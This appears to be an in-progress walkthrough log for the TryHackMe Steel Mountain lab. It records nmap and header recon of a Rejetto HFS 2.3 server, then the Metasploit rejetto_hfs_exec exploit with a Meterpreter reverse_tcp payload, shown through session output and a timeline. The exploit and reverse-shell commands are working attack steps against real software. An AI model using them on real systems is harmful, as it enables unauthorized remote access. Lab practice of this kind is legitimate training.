# Steel Mountain (THM) — Live Walkthrough

Status: In Progress
Target: 10.146.141.173
Scope: Authorized TryHackMe lab target
Last reset (UTC): 2026-05-22 22:05:22Z

## Quick status
- Initial access vector confirmed: Rejetto HFS 2.3 on tcp/8080.
- Multiple Meterpreter sessions have been opened as `STEELMOUNTAIN\\bill`.
- Current phase: stabilize one session and continue privesc chain.

## Attack path
1. Service discovery + fingerprinting.
2. Validate HFS 2.3 RCE path.
3. Exploit with compatible payload/listener.
4. Stabilize foothold and run host/privesc enumeration.

## Recon baseline (proof)
```text
$ nmap -Pn -n -p80,8080 -sV 10.146.141.173
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 8.5
8080/tcp open  http    HttpFileServer httpd 2.3
```

```text
$ curl -sI http://10.146.141.173:8080 | head
HTTP/1.1 200 OK
Server: HFS 2.3
```

## Foothold proof (code/output)
```text
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > run -z
[*] Meterpreter session 1 opened (192.168.129.182:4444 -> 10.146.141.173:49395)
```

```text
msf6 > sessions -l
Id  Type                     Information                         Connection
1   meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:49395
```

Later cycle evidence:
```text
[*] Meterpreter session 1 opened (... -> 10.146.141.173:49495)
[*] Meterpreter session 2 opened (... -> 10.146.141.173:49497)
```

## Snapshots
### Snapshot 1 — Service discovery
Time (UTC): 2026-05-22 22:04:45Z
- HFS 2.3 confirmed on 8080.
- IIS 8.5 confirmed on 80.

### Snapshot 2 — First validated foothold
Time (UTC): 2026-05-22 22:24:24Z
- Meterpreter session opened.
- Session user/context: `STEELMOUNTAIN\\bill @ STEELMOUNTAIN`.

### Snapshot 3 — Repeated foothold reliability
Time (UTC): 2026-05-22 22:41:15Z
- Additional Meterpreter sessions opened in later cycle.
- Confirms exploit path remains viable, not a one-off.

## Timeline (condensed, signal only)
- 2026-05-22 22:04:45Z — Nmap + HTTP headers confirm IIS 8.5 and HFS 2.3.
- 2026-05-22 22:24:24Z — First Meterpreter foothold opened as bill.
- 2026-05-22 22:37:20Z — Additional foothold opened (new callback port on target side).
- 2026-05-22 22:41:11Z / 22:41:15Z — Two more Meterpreter sessions opened.

## Operator note
- Prior tunnel/listener churn happened during automation hardening; noise removed from main narrative.
- Keeping one active VPN tunnel and one clean listener remains enforced operationally.

## Next actions
- Lock onto a single stable session.
- Run local/windows enum + privilege escalation checks.
- Capture user/root proof with command/output snippets and append as next milestone snapshot.
